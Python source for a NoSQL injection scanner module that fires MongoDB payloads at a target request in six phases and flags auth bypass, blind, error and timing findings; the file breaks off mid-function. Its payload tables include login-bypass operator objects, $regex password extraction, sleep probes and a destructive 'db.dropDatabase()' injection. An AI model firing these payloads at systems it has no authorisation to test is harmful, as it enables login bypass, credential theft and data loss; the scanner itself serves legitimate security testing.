"""
NoSQL Injection (NoSQLi) scan methods.

Covers all major NoSQLi attack categories as documented by PortSwigger and HackTricks:

  Phase 1  — Syntax Injection (MongoDB)
               Fuzz strings to break query syntax and detect parsing errors.
               Single-char probes (', ", `, {, ;) to isolate interpreted chars.
               Conditional boolean probes to confirm injectable behaviour.
               Null-byte injection to truncate additional query conditions.

  Phase 2  — Operator Injection
               $ne, $gt, $gte, $lt, $regex, $where, $in, $exists operators.
               URL-encoded bracket notation (param[$ne]=, param[$gt]=).
               JSON body operator injection ({"param": {"$ne": "invalid"}}).
               Authentication bypass via combined $ne / $in operators.
               Logical operator injection ($or, $and).

  Phase 3  — JavaScript Injection via $where
               $where: '1 == 1' (always-true) and '0 == 1' (always-false).
               Object.keys(this)[N].match() for field-name enumeration.
               this.field[0] == 'a' char-by-char data extraction.
               JavaScript match() / regex-based field probing.

  Phase 4  — Timing-Based Blind Injection
               sleep(5000) payloads inside $where.
               JavaScript busy-loop delays.
               Comparison against baseline response time to detect blind injection.

  Phase 5  — Operator Injection in JSON bodies
               Nested-object operator injection for POST/PUT/PATCH endpoints.
               $regex password extraction (character-by-character).
               $exists field-presence probing.

  Phase 6  — NoSQL Command / mapReduce Injection
               db.injection.insert({}) style payloads.
               mapReduce RCE probes.

  Detection:
    • Syntax errors / changed responses vs baseline (syntax injection).
    • Different true/false responses (boolean blind).
    • Response-time delta ≥ threshold (time-based blind).
    • HTTP 200 on auth payloads where original was non-200 (auth bypass).
    • Error keywords in response body (error-based).
"""

import json
import logging
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Payload tables
# ─────────────────────────────────────────────────────────────────────────────

# Phase 1 — Syntax fuzz strings
_NOSQLI_FUZZ_STRINGS = [
    # PortSwigger MongoDB fuzz string
    "'`\"{;\r\n$Foo}\r\n$Foo \\xYZ\x00",
    # Simplified variants for URL contexts
    "'",
    '"',
    "`",
    "{",
    ";",
    "$Foo",
    "\\xYZ",
    "\x00",
    # Common syntax-break strings
    "'}",
    '"}',
    "';sleep(5000);'",
    "' || '1'=='1",
    "' && '1'=='1",
    "'; return true; var a='",
]

# Phase 1 — Single-character probes (to isolate interpreted chars)
_NOSQLI_SINGLE_CHAR_PROBES = ["'", '"', '`', '{', '}', '$', ';', '\\']

# Phase 1 — Boolean condition payloads
# Tuple of (payload, expected_condition) where True = should change response if injectable
_NOSQLI_BOOLEAN_PROBES: List[Tuple[str, str]] = [
    # False conditions — should suppress results
    ("' && 0 && 'x", "false"),
    ("' && '1'=='2", "false"),
    # True conditions — should match or expand results
    ("' && 1 && 'x", "true"),
    ("' && '1'=='1", "true"),
    ("'||'1'=='1",   "true"),
    ("' || 1==1 || 'a'=='b", "true"),
]

# Phase 1 — Null byte to truncate conditions
_NOSQLI_NULL_BYTE = "'\x00"

# Phase 2 — Operator injection (URL-encoded bracket syntax)
_NOSQLI_OPERATOR_PARAMS: List[Tuple[str, str]] = [
    ("[$ne]",  "invalid"),
    ("[$gt]",  ""),
    ("[$gte]", ""),
    ("[$lt]",  "zzzzzz"),
    ("[$in][]", "admin"),
    ("[$regex]", "^.*"),
    ("[$exists]", "true"),
    ("[$where]", "1==1"),
]

# Phase 2 — Auth bypass operator payloads (JSON body)
_NOSQLI_AUTH_BYPASS_JSON: List[Dict] = [
    # $ne bypass — both fields
    {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
    # $ne username only
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    # $gt bypass
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    # $regex bypass
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    # $in bypass
    {"username": {"$in": ["admin", "administrator", "superadmin", "root"]}, "password": {"$ne": ""}},
    # $exists bypass
    {"username": {"$exists": True}, "password": {"$exists": True}},
    # Combined $or
    {"username": "admin", "password": {"$ne": ""}},
    {"username": {"$ne": ""}, "password": "admin"},
]

# Phase 2 — Logical operator injection
_NOSQLI_LOGICAL_OPERATORS = [
    # $or injection via URL
    "', $or: [ {}, { 'a':'a",
    "' } ], $comment:'successful MongoDB injection",
    # JSON-based $or
    '{"$or": [{"a": "a"}, {}]}',
]

# Phase 3 — $where JavaScript payloads
_NOSQLI_WHERE_PAYLOADS: List[Tuple[str, str]] = [
    # Always-true
    ("true, $where: '1 == 1'",       "always_true"),
    (", $where: '1 == 1'",           "always_true"),
    ("$where: '1 == 1'",             "always_true"),
    ("' , $where: '1 == 1'",         "always_true"),
    ("1, $where: '1 == 1'",          "always_true"),
    # Always-false
    ("$where: '0 == 1'",             "always_false"),
    (", $where: '0 == 1'",           "always_false"),
    # $ne operator
    ("{ $ne: 1 }",                   "operator"),
    # Pure $where injection
    ("'; return true; var a='",      "js_true"),
    ('"; return true; var xyz="a',   "js_true"),
    ("0;return true",                "js_true"),
    ('; return "a"=="a" && "a"=="',  "js_true"),
    # Field extraction probes
    ("admin' && this.password.match(/.*/)//+\x00", "field_probe"),
    ("admin' && this.passwordzz.match(/.*/)//+\x00", "field_nonexist_probe"),
]

# Phase 3 — Field enumeration via Object.keys()
_NOSQLI_KEY_ENUM_PAYLOADS = [
    '"$where":"Object.keys(this)[0].match(\'^.{0}a.*\')"',
    '"$where":"Object.keys(this)[1].match(\'^.{0}a.*\')"',
    '"$where":"Object.keys(this)[2].match(\'^.{0}a.*\')"',
]

# Phase 4 — Timing-based blind payloads
_NOSQLI_TIMING_PAYLOADS: List[Tuple[str, int]] = [
    # (payload, expected_sleep_seconds)
    ("';sleep(5000);'",                                5),
    ("';sleep(5000);+'",                               5),
    ('; sleep(5000); var a="',                         5),
    ('{"$where": "sleep(5000)"}',                      5),
    ("$where: \"sleep(5000)\"",                        5),
    # JavaScript busy-loop timing payloads (from PortSwigger)
    (
        "admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);"
        "while((x.password[0]==='a') && waitTill > new Date()){};}(this)+'",
        5,
    ),
    (
        "admin'+function(x){if(x.password[0]==='a'){sleep(5000)};}(this)+'",
        5,
    ),
    # Time-check via date arithmetic
    ("';it=new Date();do{pt=new Date();}while(pt-it<5000);",  5),
]

# Phase 5 — $regex extraction (character-by-character — probe set)
_NOSQLI_REGEX_EXTRACT_PROBES = [
    # Check if password starts with specific chars
    '{"$regex": "^a.*"}',
    '{"$regex": "^.*"}',    # always-true baseline
    '{"$regex": "^ZZZZZ"}', # always-false baseline
]

# Phase 6 — RCE / mapReduce
_NOSQLI_RCE_PAYLOADS = [
    "db.injection.insert({success:1});",
    "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
    "'; db.dropDatabase(); '",
]

# Parameter names commonly found in NoSQL-backed auth / query endpoints
_NOSQLI_LIKELY_PARAMS = {
    "username", "user", "email", "login",
    "password", "pass", "pwd",
    "id", "category", "search", "query", "q",
    "filter", "name", "type", "status",
    "token", "key", "value",
}

# Error patterns that indicate NoSQL injection was successful / syntax broken
_NOSQLI_ERROR_PATTERNS = [
    # MongoDB error keywords
    r"SyntaxError",
    r"ReferenceError",
    r"MongoError",
    r"MongoServerError",
    r"BSONTypeError",
    r"E11000 duplicate",
    r"getaddrinfo ENOTFOUND",
    r"\$where",
    r"operator.*not.*allowed",
    r"invalid operator",
    r"unknown top level operator",
    r"not an object",
    r"Unexpected token",
    r"JSON parse error",
    r"failed to parse",
    # Generic query error
    r"query.*failed",
    r"database.*error",
    r"internal server error",
]

_NOSQLI_ERROR_RE = re.compile(
    "|".join(_NOSQLI_ERROR_PATTERNS), re.IGNORECASE
)


# ─────────────────────────────────────────────────────────────────────────────
# Mixin
# ─────────────────────────────────────────────────────────────────────────────

class NoSqliScanMixin:
    """
    NoSQL Injection scan mixin.

    Expects the host class (ScanWorker) to provide:
      • self.request_data          – dict with 'url', 'request_text', headers, etc.
      • self.running               – bool stop-flag
      • self.scan_time_threshold   – float seconds for timing detection
      • self.scan_stop_on_first    – bool
      • self.scan_progress         – pyqtSignal(str)
      • self.forced_injection_points – Optional[set]
      • self._is_forced_point(prefix, name) -> bool
      • self.send_request_with_traffic(url, headers, method, body, payload, payload_type) -> resp
    """

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def scan_nosqli(self) -> Dict[str, Any]:
        """
        Run the full NoSQL injection scan suite.
        Returns a result dict compatible with scanner_tab's format_results().
        """
        self.scan_progress.emit("🍃 Starting NoSQL Injection (NoSQLi) scan...")

        request_text = self.request_data.get("request_text", "")
        full_url = self.request_data.get("url", "")

        # Parse request components
        full_url, method, headers, cookies, params, body_params, body_content = \
            self._nosqli_parse_request()

        findings: List[Dict[str, Any]] = []
        tested: int = 0

        # ── Baseline ──────────────────────────────────────────────────────────
        baseline = self._nosqli_baseline(full_url, method, headers, body_content)
        if baseline:
            self.scan_progress.emit(
                f"  📊 Baseline: HTTP {baseline['status']} | "
                f"Len {baseline['length']} | Time {baseline['time']:.3f}s"
            )

        # ── Phase 1: Syntax Injection ─────────────────────────────────────────
        if not self.running:
            return self._nosqli_result(findings, tested)

        self.scan_progress.emit("  [Phase 1] Syntax injection probes...")
        p1_findings, p1_tested = self._nosqli_phase1_syntax(
            full_url, method, headers, params, body_params, body_content, baseline
        )
        findings.extend(p1_findings)
        tested += p1_tested

        # ── Phase 2: Operator Injection ────────────────────────────────────────
        if not self.running:
            return self._nosqli_result(findings, tested)

        self.scan_progress.emit("  [Phase 2] Operator injection probes ($ne, $gt, $regex, ...)...")
        p2_findings, p2_tested = self._nosqli_phase2_operators(
            full_url, method, headers, params, body_params, body_content, baseline
        )
        findings.extend(p2_findings)
        tested += p2_tested

        # ── Phase 3: $where JavaScript Injection ──────────────────────────────
        if not self.running:
            return self._nosqli_result(findings, tested)

        self.scan_progress.emit("  [Phase 3] JavaScript $where injection probes...")
        p3_findings, p3_tested = self._nosqli_phase3_where(
            full_url, method, headers, params, body_params, body_content, baseline
        )
        findings.extend(p3_findings)
        tested += p3_tested

        # ── Phase 4: Timing-Based Blind ────────────────────────────────────────
        if not self.running:
            return self._nosqli_result(findings, tested)

        self.scan_progress.emit("  [Phase 4] Timing-based blind injection probes (sequential)...")
        p4_findings, p4_tested = self._nosqli_phase4_timing(
            full_url, method, headers, params, body_params, body_content, baseline
        )
        findings.extend(p4_findings)
        tested += p4_tested

        # ── Phase 5: JSON Body Operator Injection ─────────────────────────────
        if not self.running:
            return self._nosqli_result(findings, tested)

        self.scan_progress.emit("  [Phase 5] JSON body operator injection...")
        p5_findings, p5_tested = self._nosqli_phase5_json_operators(
            full_url, method, headers, params, body_params, body_content, baseline
        )
        findings.extend(p5_findings)
        tested += p5_tested

        # ── Phase 6: RCE / mapReduce Probes ───────────────────────────────────
        if not self.running:
            return self._nosqli_result(findings, tested)

        self.scan_progress.emit("  [Phase 6] RCE / mapReduce probes...")
        p6_findings, p6_tested = self._nosqli_phase6_rce(
            full_url, method, headers, params, body_params, body_content, baseline
        )
        findings.extend(p6_findings)
        tested += p6_tested

        result = self._nosqli_result(findings, tested)

        if result["vulnerable"]:
            self.scan_progress.emit(
                f"⚠️  NoSQLi DETECTED — {len(findings)} finding(s) across {tested} probes"
            )
        else:
            self.scan_progress.emit(
                f"✓ NoSQLi scan complete — {tested} probes, no injection detected"
            )

        return result

    # ------------------------------------------------------------------
    # Phase 1 — Syntax injection
    # ------------------------------------------------------------------

    def _nosqli_phase1_syntax(
        self, full_url, method, headers, params, body_params, body_content, baseline
    ) -> Tuple[List[Dict], int]:
        findings: List[Dict] = []
        tested = 0

        candidates = self._nosqli_get_candidates(params, body_params, prefix="url")
        candidates += self._nosqli_get_candidates(body_params, {}, prefix="body")

        for cname, ctype, cval in candidates:
            if not self.running:
                break

            # 1a — Full fuzz string
            for fuzz in _NOSQLI_FUZZ_STRINGS:
                if not self.running:
                    break
                payload = fuzz
                resp, elapsed = self._nosqli_send(
                    full_url, method, headers, params, body_params,
                    body_content, cname, ctype, payload,
                    label=f"NoSQLi-Syntax-Fuzz [{cname}]"
                )
                tested += 1
                if resp and baseline:
                    if self._nosqli_is_syntax_error(resp):
                        finding = self._nosqli_make_finding(
                            cname, ctype, payload,
                            "Syntax Error Response",
                            "High",
                            "Response contains NoSQL error keywords after fuzz string injection. "
                            "Application is not sanitising input before constructing the query.",
                            resp
                        )
                        findings.append(finding)
                        self.scan_progress.emit(
                            f"    ⚠️  Syntax error detected: param={cname} payload={repr(payload[:40])}"
                        )
                        if self.scan_stop_on_first:
                            break

            if findings and self.scan_stop_on_first:
                break

            # 1b — Boolean probes (need true/false pair)
            true_resp = false_resp = None
            for payload, condition in _NOSQLI_BOOLEAN_PROBES:
                if not self.running:
                    break
                resp, elapsed = self._nosqli_send(
                    full_url, method, headers, params, body_params,
                    body_content, cname, ctype, payload,
                    label=f"NoSQLi-Boolean-{condition} [{cname}]"
                )
                tested += 1
                if condition == "true":
                    true_resp = resp
                else:
                    false_resp = resp

            if true_resp and false_resp and baseline:
                if self._nosqli_responses_differ(true_resp, false_resp, baseline):
                    payload_desc = "' && 1 && 'x  vs  ' && 0 && 'x"
                    finding = self._nosqli_make_finding(
                        cname, ctype, payload_desc,
                        "Boolean Blind NoSQLi",
                        "High",
                        "True-condition and false-condition payloads produce different responses. "
                        "Boolean-based blind NoSQL injection confirmed.",
                        true_resp
                    )
                    findings.append(finding)
                    self.scan_progress.emit(
                        f"    ⚠️  Boolean blind NoSQLi: param={cname}"
                    )

            # 1c — Null byte truncation
            null_payload = cval + _NOSQLI_NULL_BYTE
            resp, elapsed = self._nosqli_send(
                full_url, method, headers, params, body_params,
                body_content, cname, ctype, null_payload,
                label=f"NoSQLi-NullByte [{cname}]"
            )
            tested += 1
            if resp and baseline:
                if self._nosqli_response_changed(resp, baseline):
                    finding = self._nosqli_make_finding(
                        cname, ctype, null_payload,
                        "Null-byte Condition Truncation",
                        "Medium",
                        "Injecting a null byte after the value changes the response, suggesting "
                        "MongoDB may be ignoring trailing query conditions (e.g. this.released==1).",
                        resp
                    )
                    findings.append(finding)
                    self.scan_progress.emit(
                        f"    ⚠️  Null-byte truncation: param={cname}"
                    )

        return findings, tested

    # ------------------------------------------------------------------
    # Phase 2 — Operator injection
    # ------------------------------------------------------------------

    def _nosqli_phase2_operators(
        self, full_url, method, headers, params, body_params, body_content, baseline
    ) -> Tuple[List[Dict], int]:
        findings: List[Dict] = []
        tested = 0

        # 2a — URL bracket notation: param[$ne]=invalid
        for pname in list(params.keys()):
            if not self.running:
                break
            if not self._is_forced_point("url", pname):
                continue

            parsed = urllib.parse.urlparse(full_url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

            for op_suffix, op_val in _NOSQLI_OPERATOR_PARAMS:
                if not self.running:
                    break
                # Build modified URL: remove original param, add param[op]=val
                new_qs = {k: v for k, v in qs.items() if k != pname}
                new_qs[pname + op_suffix] = [op_val]
                new_query = urllib.parse.urlencode(new_qs, doseq=True)
                new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

                payload_label = f"{pname}{op_suffix}={op_val}"
                resp, elapsed = self._nosqli_send_raw_url(
                    new_url, method, headers, body_content,
                    payload=payload_label,
                    label=f"NoSQLi-Op-URL [{pname}{op_suffix}]"
                )
                tested += 1

                if resp and baseline:
                    if self._nosqli_is_auth_bypass(resp, baseline):
                        finding = self._nosqli_make_finding(
                            pname + op_suffix, "param_url", op_val,
                            "Operator Injection — Auth Bypass (URL)",
                            "Critical",
                            f"MongoDB operator {op_suffix.strip('[]')} injected via URL bracket "
                            f"notation caused an auth bypass (HTTP {baseline['status']} → "
                            f"HTTP {getattr(resp, 'status_code', '?')}).",
                            resp
                        )
                        findings.append(finding)
                        self.scan_progress.emit(
                            f"    🚨 Auth bypass via URL operator: {pname}{op_suffix}"
                        )
                    elif self._nosqli_is_syntax_error(resp):
                        finding = self._nosqli_make_finding(
                            pname + op_suffix, "param_url", op_val,
                            "Operator Injection — Syntax Error",
                            "Medium",
                            f"MongoDB operator injection via URL bracket notation caused an error "
                            f"response, indicating the operator is being evaluated.",
                            resp
                        )
                        findings.append(finding)

                if findings and self.scan_stop_on_first:
                    break

        # 2b — POST body operator injection (form-urlencoded)
        for pname, pvals in list(body_params.items()):
            if not self.running:
                break
            if not self._is_forced_point("body", pname):
                continue

            for op_suffix, op_val in _NOSQLI_OPERATOR_PARAMS:
                if not self.running:
                    break
                # Replace pname with pname[op] in body
                new_body = self._nosqli_inject_body_param(
                    body_content, pname, pname + op_suffix, op_val
                )
                payload_label = f"{pname}{op_suffix}={op_val}"
                resp, elapsed = self._nosqli_send_raw_url(
                    full_url, method, headers, new_body,
                    payload=payload_label,
                    label=f"NoSQLi-Op-Body [{pname}{op_suffix}]"
                )
                tested += 1

                if resp and baseline:
                    if self._nosqli_is_auth_bypass(resp, baseline):
                        finding = self._nosqli_make_finding(
                            pname + op_suffix, "param_body", op_val,
                            "Operator Injection — Auth Bypass (Body)",
                            "Critical",
                            f"MongoDB operator {op_suffix.strip('[]')} injected via POST body "
                            f"bracket notation caused an auth bypass.",
                            resp
                        )
                        findings.append(finding)
                        self.scan_progress.emit(
                            f"    🚨 Auth bypass via body operator: {pname}{op_suffix}"
                        )
                    elif self._nosqli_is_syntax_error(resp):
                        finding = self._nosqli_make_finding(
                            pname + op_suffix, "param_body", op_val,
                            "Operator Injection — Syntax Error (Body)",
                            "Medium",
                            "MongoDB operator injection in POST body caused an error response.",
                            resp
                        )
                        findings.append(finding)

        return findings, tested

    # ------------------------------------------------------------------
    # Phase 3 — $where JavaScript injection
    # ------------------------------------------------------------------

    def _nosqli_phase3_where(
        self, full_url, method, headers, params, body_params, body_content, baseline
    ) -> Tuple[List[Dict], int]:
        findings: List[Dict] = []
        tested = 0

        candidates = self._nosqli_get_candidates(params, body_params, prefix="url")
        candidates += self._nosqli_get_candidates(body_params, {}, prefix="body")

        for cname, ctype, cval in candidates:
            if not self.running:
                break

            true_resp = None
            false_resp = None

            for payload, condition in _NOSQLI_WHERE_PAYLOADS:
                if not self.running:
                    break

                resp, elapsed = self._nosqli_send(
                    full_url, method, headers, params, body_params,
                    body_content, cname, ctype, payload,
                    label=f"NoSQLi-Where-{condition} [{cname}]"
                )
                tested += 1

                if condition in ("always_true", "js_true"):
                    true_resp = resp
                elif condition == "always_false":
                    false_resp = resp
                elif condition == "operator":
                    if resp and baseline and self._nosqli_is_syntax_error(resp):
                        finding = self._nosqli_make_finding(
                            cname, ctype, payload,
                            "Operator/$where Injection — Error Response",
                            "High",
                            "$where or operator injection caused a NoSQL error response.",
                            resp
                        )
                        findings.append(finding)
                        self.scan_progress.emit(
                            f"    ⚠️  $where / operator error: param={cname}"
                        )

                elif condition in ("field_probe", "field_nonexist_probe"):
                    # Compare with opposite probe — same param, different field names
                    pass  # Handled below as a pair

            # Check boolean difference between true/false $where responses
            if true_resp and false_resp and baseline:
                if self._nosqli_responses_differ(true_resp, false_resp, baseline):
                    finding = self._nosqli_make_finding(
                        cname, ctype,
                        "$where: '1==1' vs $where: '0==1'",
                        "Boolean $where JavaScript Injection",
                        "High",
                        "$where JavaScript injection confirmed: different responses for always-true "
                        "vs always-false conditions. Server is evaluating injected JavaScript.",
                        true_resp
                    )
                    findings.append(finding)
                    self.scan_progress.emit(
                        f"    ⚠️  $where boolean injection: param={cname}"
                    )

        return findings, tested

    # ------------------------------------------------------------------
    # Phase 4 — Timing-based blind injection
    # ------------------------------------------------------------------

    def _nosqli_phase4_timing(
        self, full_url, method, headers, params, body_params, body_content, baseline
    ) -> Tuple[List[Dict], int]:
        findings: List[Dict] = []
        tested = 0

        threshold = getattr(self, "scan_time_threshold", 1.5)
        baseline_time = baseline["time"] if baseline else 0.5

        candidates = self._nosqli_get_candidates(params, body_params, prefix="url")
        candidates += self._nosqli_get_candidates(body_params, {}, prefix="body")

        for cname, ctype, cval in candidates:
            if not self.running:
                break

            for payload, sleep_sec in _NOSQLI_TIMING_PAYLOADS:
                if not self.running:
                    break

                start = time.time()
                resp, elapsed = self._nosqli_send(
                    full_url, method, headers, params, body_params,
                    body_content, cname, ctype, payload,
                    label=f"NoSQLi-Timing [{cname}]"
                )
                tested += 1
                measured = time.time() - start

                expected_delta = sleep_sec - baseline_time
                if measured >= (baseline_time + max(expected_delta * 0.7, threshold)):
                    finding = self._nosqli_make_finding(
                        cname, ctype, payload,
                        "Time-based Blind NoSQLi",
                        "High",
                        f"Response delayed {measured:.2f}s (baseline {baseline_time:.2f}s) "
                        f"when injecting sleep() payload. Blind time-based NoSQL injection confirmed.",
                        resp
                    )
                    findings.append(finding)
                    self.scan_progress.emit(
                        f"    ⚠️  Time-based blind NoSQLi: param={cname} delay={measured:.2f}s"
                    )
                    if self.scan_stop_on_first:
                        break

        return findings, tested

    # ------------------------------------------------------------------
    # Phase 5 — JSON body operator injection
    # ------------------------------------------------------------------

    def _nosqli_phase5_json_operators(
        self, full_url, method, headers, params, body_params, body_content, baseline
    ) -> Tuple[List[Dict], int]:
        findings: List[Dict] = []
        tested = 0

        # Only applicable when content-type is JSON or we can probe it
        ct = ""
        for k, v in headers.items():
            if k.lower() == "content-type":
                ct = v.lower()
                break

        # Try JSON operator injection for each body param pair
        try:
            existing_json = json.loads(body_content) if body_content.strip() else {}
        except Exception:
            existing_json = {}

        # Build base keys from existing JSON or body params
        param_keys = list(existing_json.keys()) if existing_json else list(body_params.keys())

        if not param_keys:
            return findings, tested

        json_headers = {k: v for k, v in headers.items()}
        json_headers["Content-Type"] = "application/json"

        for bypass_payload in _NOSQLI_AUTH_BYPASS_JSON:
            if not self.running:
                break

            # Only inject if the payload keys match the known fields
            # (or if we have no known fields, try anyway)
            merged = {**existing_json, **bypass_payload}
            body_str = json.dumps(merged)
            payload_label = json.dumps(bypass_payload)

            resp, elapsed = self._nosqli_send_raw_url(
                full_url, method, json_headers, body_str,
                payload=payload_label[:80],
                label=f"NoSQLi-JSON-Op"
            )
            tested += 1

            if resp and baseline:
                if self._nosqli_is_auth_bypass(resp, baseline):
                    finding = self._nosqli_make_finding(
                        "JSON body", "param_body", payload_label,
                        "JSON Operator Injection — Auth Bypass",
                        "Critical",
                        f"Injecting MongoDB operator objects into the JSON body bypassed "
                        f"authentication (HTTP {baseline['status']} → "
                        f"HTTP {getattr(resp, 'status_code', '?')}). "
                        f"Payload: {payload_label}",
                        resp
                    )
                    findings.append(finding)
                    self.scan_progress.emit(
                        f"    🚨 JSON operator auth bypass: {payload_label[:60]}"
                    )
                    if self.scan_stop_on_first:
                        break
                elif self._nosqli_is_syntax_error(resp):
                    finding = self._nosqli_make_finding(
                        "JSON body", "param_body", payload_label,
                        "JSON Operator Injection — Error Response",
                        "Medium",
                        "Injecting MongoDB operators into the JSON body caused an error, "
                        "suggesting operator injection is being evaluated.",
                        resp
                    )
                    findings.append(finding)

        # Phase 5b — $regex char extraction probe
        for pname in param_keys:
            if not self.running:
                break
            if not self._is_forced_point("body", pname):
                continue

            for regex_probe in _NOSQLI_REGEX_EXTRACT_PROBES:
                if not self.running:
                    break
                probe_json = {**existing_json, pname: json.loads(regex_probe)}
                body_str = json.dumps(probe_json)
                resp, elapsed = self._nosqli_send_raw_url(
                    full_url, method, json_headers, body_str,
                    payload=f"{pname}: {regex_probe}",
                    label=f"NoSQLi-Regex [{pname}]"
                )
                tested += 1

                if resp and baseline:
                    if self._nosqli_is_auth_bypass(resp, baseline):
                        finding = self._nosqli_make_finding(
                            pname, "param_body", regex_probe,
                            "$regex Operator Injection — Data Extraction",
                            "High",
                            f"$regex operator injection on field '{pname}' produced a "
                            f"different response, indicating the regex is being evaluated. "
                            f"Character-by-character data extraction may be possible.",
                            resp
                        )
                        findings.append(finding)
                        self.scan_progress.emit(
                            f"    ⚠️  $regex injection: param={pname}"
                        )

        return findings, tested

    # ------------------------------------------------------------------
    # Phase 6 — RCE / mapReduce
    # ------------------------------------------------------------------

    def _nosqli_phase6_rce(
        self, full_url, method, headers, params, body_params, body_content, baseline
    ) -> Tuple[List[Dict], int]:
        findings: List[Dict] = []
        tested = 0

        candidates = self._nosqli_get_candidates(params, body_params, prefix="url")
        candidates += self._nosqli_get_candidates(body_params, {}, prefix="body")

        for cname, ctype, cval in candidates:
            if not self.running:
                break

            for payload in _NOSQLI_RCE_PAYLOADS:
                if not self.running:
                    break

                resp, elapsed = self._nosqli_send(
                    full_url, method, headers, params, body_params,
                    body_content, cname, ctype, payload,
                    label=f"NoSQLi-RCE [{cname}]"
                )
                tested += 1

                if resp and self._nosqli_is_syntax_error(resp):
                    finding = self._nosqli_make_finding(
                        cname, ctype, payload,
                        "Potential NoSQLi RCE / Command Injection",
                        "Critical",
                        f"db.* command injection payload caused an error/changed response. "
                        f"Server may be evaluating arbitrary MongoDB commands.",
                        resp
                    )
                    findings.append(finding)
                    self.scan_progress.emit(
                        f"    🚨 Potential RCE via NoSQLi: param={cname}"
                    )

        return findings, tested

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _nosqli_parse_request(self):
        """Parse request_data into components. Returns same tuple as _parse_request_components."""
        import json as _json

        full_url = self.request_data.get("url", "")
        request_text = self.request_data.get("request_text", "")
        lines = request_text.split('\n')

        method = "GET"
        if lines:
            fl = lines[0].strip().upper()
            for m in ("POST", "PUT", "PATCH", "DELETE"):
                if fl.startswith(m):
                    method = m
                    break

        headers: Dict[str, str] = {}
        cookies: Dict[str, str] = {}
        body_content = ""

        for idx, line in enumerate(lines[1:], 1):
            stripped = line.strip()
            if stripped == "" or stripped == "\r\n":
                body_content = "\n".join(lines[idx + 1:])
                break
            if ':' in line:
                k, v = line.split(':', 1)
                k, v = k.strip(), v.strip()
                if k.lower() not in {kk.lower() for kk in headers}:
                    headers[k] = v
                if k.lower() == 'cookie':
                    for pair in re.split(r';\s*', v):
                        if '=' in pair:
                            cn, cv = pair.split('=', 1)
                            cookies[cn.strip()] = cv.strip()

        parsed_url = urllib.parse.urlparse(full_url)
        params = urllib.parse.parse_qs(parsed_url.query)

        body_params: Dict[str, List] = {}
        if method in ("POST", "PUT", "PATCH") and body_content.strip():
            ct = ""
            for k, v in headers.items():
                if k.lower() == "content-type":
                    ct = v.lower()
                    break
            if "application/json" in ct:
                try:
                    jdata = _json.loads(body_content.strip())
                    if isinstance(jdata, dict):
                        body_params = {k: [str(v)] for k, v in jdata.items()}
                except Exception:
                    pass
            elif "multipart/form-data" not in ct:
                try:
                    body_params = urllib.parse.parse_qs(
                        body_content.strip(), keep_blank_values=True
                    )
                except Exception:
                    pass

        return full_url, method, headers, cookies, params, body_params, body_content

    def _nosqli_baseline(self, full_url, method, headers, body_content) -> Optional[Dict]:
        """Send original request and record baseline metrics."""
        clean = {k: v for k, v in headers.items() if k.lower() != "host"}
        try:
            start = time.time()
            resp = self.send_request_with_traffic(
                full_url, clean, method=method,
                body=body_content,
                payload="[BASELINE]", payload_type="NoSQLi-Baseline"
            )
            elapsed = round(time.time() - start, 3)
            if resp and hasattr(resp, "status_code"):
                return {
                    "status": getattr(resp, "status_code", 0),
                    "length": len(getattr(resp, "content", b"")),
                    "time": elapsed,
                    "text": getattr(resp, "text", "")[:4000],
                }
        except Exception as e:
            logger.warning(f"NoSQLi baseline error: {e}")
        return None

    def _nosqli_get_candidates(self, primary_params, secondary_params, prefix="url"):
        """
        Return list of (name, type, value) tuples for testable parameters.
        Prioritises known NoSQL-relevant param names but returns all if none match.
        """
        candidates = []
        source = primary_params if prefix == "url" else secondary_params

        for pname, pvals in source.items():
            val = pvals[0] if isinstance(pvals, list) and pvals else str(pvals)

            if not self._is_forced_point(prefix, pname):
                continue

            param_type = "param_url" if prefix == "url" else "param_body"
            candidates.append((pname, param_type, val))

        return candidates

    def _nosqli_send(
        self, full_url, method, headers, params, body_params,
        body_content, param_name, param_type, payload, label=""
    ) -> Tuple[Any, float]:
        """Inject payload into the specified parameter and send the request."""
        clean_headers = {k: v for k, v in headers.items() if k.lower() != "host"}
        parsed = urllib.parse.urlparse(full_url)

        start = time.time()
        try:
            if param_type == "param_url":
                # Inject into URL query string
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[param_name] = [payload]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                resp = self.send_request_with_traffic(
                    new_url, clean_headers, method=method,
                    body=body_content,
                    payload=payload[:80], payload_type=label or "NoSQLi"
                )
            else:
                # Inject into body
                ct = ""
                for k, v in headers.items():
                    if k.lower() == "content-type":
                        ct = v.lower()
                        break

                if "application/json" in ct:
                    try:
                        jdata = json.loads(body_content) if body_content.strip() else {}
                    except Exception:
                        jdata = {}
                    jdata[param_name] = payload
                    new_body = json.dumps(jdata)
                else:
                    bparams = urllib.parse.parse_qs(body_content, keep_blank_values=True)
                    bparams[param_name] = [payload]
                    new_body = urllib.parse.urlencode(bparams, doseq=True)

                resp = self.send_request_with_traffic(
                    full_url, clean_headers, method=method,
                    body=new_body,
                    payload=payload[:80], payload_type=label or "NoSQLi"
                )
        except Exception as e:
            logger.debug(f"NoSQLi send error: {e}")
            resp = None
        elapsed = time.time() - start
        return resp, elapsed

    def _nosqli_send_raw_url(
        self, url, method, headers, body_content, payload="", label=""
    ) -> Tuple[Any, float]:
        """Send a pre-built URL/body directly (for operator injection)."""
        clean = {k: v for k, v in headers.items() if k.lower() != "host"}
        start = time.time()
        try:
            resp = self.send_request_with_traffic(
                url, clean, method=method,
                body=body_content,
                payload=payload[:80], payload_type=label or "NoSQLi"
            )
        except Exception as e:
            logger.debug(f"NoSQLi raw send error: {e}")
            resp = None
        elapsed = time.time() - start
        return resp, elapsed

    def _nosqli_inject_body_param(
        self, body_content: str, old_name: str, new_name: str, new_val: str
    ) -> str:
